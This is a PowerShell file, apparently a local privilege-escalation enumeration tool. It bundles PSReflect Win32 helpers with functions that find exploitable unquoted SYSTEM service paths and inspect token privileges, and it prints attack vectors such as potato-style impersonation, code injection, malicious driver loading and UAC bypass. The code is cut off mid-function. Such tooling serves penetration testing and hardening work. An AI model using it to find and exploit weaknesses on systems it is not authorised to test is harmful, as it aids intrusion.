. "$PSScriptRoot\utils.ps1"

####################################################################################
#                                                                                  #
# PSReflect code for Windows API access                                            #
# Author: @mattifestation                                                          #
# https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1 #
#                                                                                  #
####################################################################################

function New-InMemoryModule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}



function Find-UnquotedServicePaths {
    [CmdletBinding()]
    param (
        [switch]$Exploitable
    )

    Write-Host "`n[+] Scanning for Unquoted Service Paths running as SYSTEM...`n"

    $results = @()
    $services = Get-WmiObject Win32_Service

    if ($($services | Measure-Object).Count -lt 1) {
        Write-Host "No unquoted service paths were found"
    }

    foreach ($service in $services) {
        $path = ($service.PathName).Trim()
        $name = $service.Name
        $user = $service.StartName

        # Skip if no path or is already quoted
        if (-not $path -or $path.StartsWith('"')) { continue }

        # Extract path until ".exe" (without arguments)
        $m = [regex]::Match($path, '^(?<exe>[^"]*?\.exe)\b', 'IgnoreCase')
        if (-not $m.Success) { continue }

        $exePath = $m.Groups['exe'].Value.Trim()

        # Must be run as SYSTEM
        if ($user -ne "LocalSystem") { continue }

        # Ignore svchost.exe in system32 (common false positive)
        if ($exePath -imatch '\\system32\\svchost\.exe$') { continue }

        # If doesn't contain spaces, not vulnerable
        if ($exePath -notmatch ' ') { continue }

        $entry = [PSCustomObject]@{
            ServiceName       = $name
            Path              = $path
            StartUser         = $user
            CandidateSegments = @()
            Exploitable       = $false
        }

        # Generate candidates splitting by every space within the path
        $parts = $exePath.Split(" ")
        for ($i = 0; $i -lt $parts.Length - 1; $i++) {
            $partialPath = ($parts[0..$i] -join " ") + ".exe"

            $segmentInfo = [PSCustomObject]@{
                CandidatePath = $partialPath
                Exists        = $false
                Writable      = $false
                Error         = $null
            }

            try {
                $segmentInfo.Exists = Test-Path -LiteralPath $partialPath
                $parent = Split-Path $partialPath -ErrorAction Stop
                $acl = Get-Acl $parent -ErrorAction SilentlyContinue
                $perm = $acl.Access | Where-Object {
                    ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::WriteData) -or
                    ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify)
                }
                if ($perm) {
                    $segmentInfo.Writable = Test-WriteAccess -Directory $parent
                }
            }
            catch {
                $segmentInfo.Error = $_.Exception.Message
            }

            if ($segmentInfo.Writable) {
                $entry.Exploitable = $true
            }

            $entry.CandidateSegments += $segmentInfo
        }

        if ($Exploitable) {
            if ($entry.Exploitable) {
                $results += $entry
            }
        } else {
            $results += $entry
        }
    }

    return $results
}

function Get-UserPrivilegeInfo {
    Write-Host "`n[+] Get User Privilege Information:" -ForegroundColor Green

    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    $isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    $groups = $identity.Groups | ForEach-Object {
        try {
            "$($_.Translate([System.Security.Principal.NTAccount])) ($($_.Value))"
        } catch {
            "[Unknown or inaccessible] ($($_.Value))"
        }
    }

    $result = @{
        Username   = $identity.Name
        IsAdmin    = $isAdmin
        SID        = $identity.User.Value
        TokenType  = $identity.ImpersonationLevel.ToString()
        Groups     = $groups
    }

    return $result
}

function Get-TokenInformation {
<#
.SYNOPSIS
Retrieves token information from a process token using Win32 API.

.DESCRIPTION
The Get-TokenInformation function wraps the native Windows API call 'GetTokenInformation'
to retrieve various types of data from an access token, such as user SID, groups, or privileges.

It allocates unmanaged memory for the result, invokes the API call, and returns the buffer pointer.
The parsing of the buffer is left to the caller, as the structure varies depending on the information requested.

.PARAMETER TokenHandle
A handle to the token from which information will be retrieved.

.PARAMETER InformationType
A string representing the TOKEN_INFORMATION_CLASS enumeration (e.g., 'TokenUser', 'TokenGroups', 'TokenPrivileges').

.OUTPUTS
System.IntPtr - A pointer to the raw buffer containing the requested token information.

.EXAMPLE
$tokenInfoPtr = Get-TokenInformation -TokenHandle $handle -InformationType 'TokenGroups'
#>
    param (
        [IntPtr]$TokenHandle,
        [string]$InformationType
    )

    $infoClass = $TOKEN_INFORMATION_CLASS::$InformationType
    $bufferSize = 0

    $success = $Advapi32::GetTokenInformation($TokenHandle, $infoClass, 0, $bufferSize, [ref]$bufferSize)

    [IntPtr]$tokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)

    $success = $Advapi32::GetTokenInformation($TokenHandle, $infoClass, $TokenPtr, $bufferSize, [ref]$bufferSize)

    if (-not $success) {
        Write-Warning "Failed to retrieve token information for $InformationType"
        Free-TokenBuffer $tokenPtr
        return $null
    }
    
    return $tokenPtr
}

function Show-TokenCapabilities {
    [CmdletBinding()]
    param(
        [string]$OwnerSidStr,
        [string]$PrimaryGroupSidStr,
        [psobject]$TokenSummaryPrivileges,
        [bool]$IsElevated,
        [string]$ElevationTypeStr,
        [IntPtr]$LinkedHandle,
        [string]$IntegrityLabel,
        [psobject]$TokenSummaryGroups,
        [psobject]$TokenSummaryStats,
        [psobject]$TokenLogonGroups,
        [bool]$TokenUIAccess = $false
    )

    Write-Host "`n[=] Potential Capabilities (and attack vectors):`n" -ForegroundColor Yellow

    # Collect enabled privileges by name
    $enabledPrivilegeNames = @()
    if ($TokenSummaryPrivileges) {
        $enabledPrivilegeNames = $TokenSummaryPrivileges |
            Where-Object { $_.Attributes.ToString() -match 'ENABLED' } |
            ForEach-Object { $_.Privilege }
    }

    # 1) Ownership or primary admin group
    if (($OwnerSidStr -match 'S-1-5-32-544') -or ($PrimaryGroupSidStr -match 'S-1-5-32-544')) {
        Write-Host "[+] Administrative ownership inheritance"
        Write-Host "    Any newly created object may inherit Admin ownership." -ForegroundColor Green
        Write-Host "    -> Persistence possible by creating admin-owned resources."
    }

    # 2) Impersonation level
    if ($TokenSummaryStats -and $TokenSummaryStats.ImpersonationLevel) {
        Write-Host ("[+] Impersonation level: {0}" -f $TokenSummaryStats.ImpersonationLevel)
        switch -Regex ($TokenSummaryStats.ImpersonationLevel) {
            'Anonymous|SecurityAnonymous' {
                Write-Host "    Anonymous: very limited capabilities." -ForegroundColor Green
            }
            'Identification' {
                Write-Host "    Identification: can query identity/permissions but not act as the user." -ForegroundColor Green
            }
            'Impersonation' {
                Write-Host "    Impersonation: can perform local actions as the impersonated user." -ForegroundColor Green
            }
            'Delegation' {
                Write-Host "    Delegation: can impersonate remotely across multiple hops (Kerberos delegation)." -ForegroundColor Green
            }
        }
    }

    # 3) Impersonation or primary token usage
    if ($enabledPrivilegeNames -contains 'SeImpersonatePrivilege' -or $enabledPrivilegeNames -contains 'SeAssignPrimaryTokenPrivilege') {
        Write-Host "[+] Impersonation / primary-token capable"
        Write-Host "    Can act under another user's context (e.g., SYSTEM) via token duplication." -ForegroundColor Green
        Write-Host "    -> Exploitable with potato-style attacks."
    }

    # 4) Debugging privileged processes
    if ($enabledPrivilegeNames -contains 'SeDebugPrivilege') {
        Write-Host "[+] Debug-capable"
        Write-Host "    Can open and inspect SYSTEM processes and memory." -ForegroundColor Green
        Write-Host "    -> Allows reading secrets or injecting code."
    }

    # 5) Backup/restore semantics
    if ($enabledPrivilegeNames -contains 'SeBackupPrivilege' -or $enabledPrivilegeNames -contains 'SeRestorePrivilege') {
        Write-Host "[+] Backup/Restore semantics"
        Write-Host "    Can bypass ACLs when reading/writing files or registry." -ForegroundColor Green
        Write-Host "    -> Potential for extracting sensitive data or altering protected configs."
    }

    # 6) Take ownership
    if ($enabledPrivilegeNames -contains 'SeTakeOwnershipPrivilege') {
        Write-Host "[+] Ownership takeover capable"
        Write-Host "    Can forcibly take ownership and change ACLs of protected objects." -ForegroundColor Green
        Write-Host "    -> Useful for persistence or escalation on locked resources."
    }

    # 7) Load drivers
    if ($enabledPrivilegeNames -contains 'SeLoadDriverPrivilege') {
        Write-Host "[+] Driver-load capable"
        Write-Host "    Permitted to load kernel-mode drivers (depending on signing policy)." -ForegroundColor Green
        Write-Host "    -> Can install malicious drivers for kernel-level access."
    }

    # 8) Symbolic links at high IL
    if (($enabledPrivilegeNames -contains 'SeCreateSymbolicLinkPrivilege') -and ($IntegrityLabel -match 'HIGH|SYSTEM')) {
        Write-Host "[+] Symbolic-link creation at high integrity"
        Write-Host "    Can redirect privileged processes/files via symlinks." -ForegroundColor Green
    }

    # 9) Dual UAC context
    if ((-not $IsElevated) -and ($ElevationTypeStr -match 'Limited') -and ($LinkedHandle -ne [IntPtr]::Zero)) {
        Write-Host "[+] Dual-token (UAC) context"
        Write-Host "    Limited token linked to an elevated token." -ForegroundColor Green
        Write-Host "    -> Possible UAC bypass via token swapping."
    }

    # 10) High/System integrity
    if ($IntegrityLabel -match 'HIGH|SYSTEM') {
        Write-Host "[+] High/System integrity context"
        Write-Host "    Operates above medium-integrity processes/objects." -ForegroundColor Green
        Write-Host "    -> Can tamper with lower-integrity processes and data."
    }

    # 11) UIAccess
    if ($TokenUIAccess) {
        Write-Host "[+] UIAccess enabled"
        Write-Host "    Token can bypass UIPI (User Interface Privilege Isolation)." -ForegroundColor Green
        Write-Host "    -> Allows sending keystrokes/mouse events to elevated apps or reading privileged UI elements."
    }

    # 12) Logon SID correlation
    if ($TokenLogonGroups -and $TokenLogonGroups.GroupsCount -ge 1) {
        Write-Host "[+] Logon SID present"
        Write-Host "    Token is tied to a specific logon session (S-1-5-5-...). " -ForegroundColor Green
        Write-Host "    -> Useful to correlate processes in the same session and prioritize accessible objects/handles."
    }
}

# Requiere que tengamos PSReflect cargado y:
# (func kernel32  GetCurrentThread ([IntPtr]) @())
# (func advapi32 OpenThreadToken ([Bool]) @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) -SetLastError)

function Open-ProcessHandle {
    param(
        [UInt32]$Id = $PID,
        [PROCESS_ACCESS]$Access = [PROCESS_ACCESS]::PROCESS_QUERY_LIMITED_INFORMATION
    )
    if ($Id -eq $PID) {
        return $Kernel32::GetCurrentProcess()
    }
    $procHandle = $Kernel32::OpenProcess([uint32]$Access, $false, [uint32]$Id)
    # Fallback para sistemas viejos donde QUERY_LIMITED no existe
    if ($procHandle -eq [IntPtr]::Zero -and ([PROCESS_ACCESS]$Access).HasFlag([PROCESS_ACCESS]::PROCESS_QUERY_LIMITED_INFORMATION)) {
        $procHandle = $Kernel32::OpenProcess([uint32][PROCESS_ACCESS]::PROCESS_QUERY_INFORMATION, $false, [uint32]$Id)
    }
    return $procHandle
}

function Open-TokenHandle {
    param(
        [IntPtr]$ProcessHandle,
        [TOKEN_ACCESS]$DesiredAccess = [TOKEN_ACCESS]::TOKEN_QUERY,
        # If we are not as Impersonated, we try first the thread token
        [switch]$UseThread,
        # if UAC, returned the linked one (elevated) if exists
        [switch]$UseLinked
    )
    $tokenHandle = [IntPtr]::Zero

    if ($UseThread) {
        $thread = $Kernel32::GetCurrentThread()
        $null = $Advapi32::OpenThreadToken($thread, [uint32]$DesiredAccess, $true, [ref]$tokenHandle)
    }
    if ($tokenHandle -eq [IntPtr]::Zero) {
        if (-not $Advapi32::OpenProcessToken($ProcessHandle, [uint32]$DesiredAccess, [ref]$tokenHandle)) {
            return [IntPtr]::Zero 
        }
    }

    if ($UseLinked) {
        $linkedTokenBuffer = Get-TokenInformation -TokenHandle $tokenHandle -InformationType "TokenLinkedToken"
        if ($linkedTokenBuffer) {
            try {
                $linked = ($linkedTokenBuffer -as $TOKEN_LINKED_TOKEN).LinkedToken
                if ($tokenHandle -and $linked -ne [IntPtr]::Zero) { 
                    Close-Token $tokenHandle; 
                    $tokenHandle = $linked 
                }
            } finally { 
                [Runtime.InteropServices.Marshal]::FreeHGlobal($linkedTokenBuffer) 
            }
        }
    }
    return $tokenHandle
}

function Get-TokenSummary {
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [Alias('ProcId','ProcessId')]
        [UInt32]$Id = $PID,
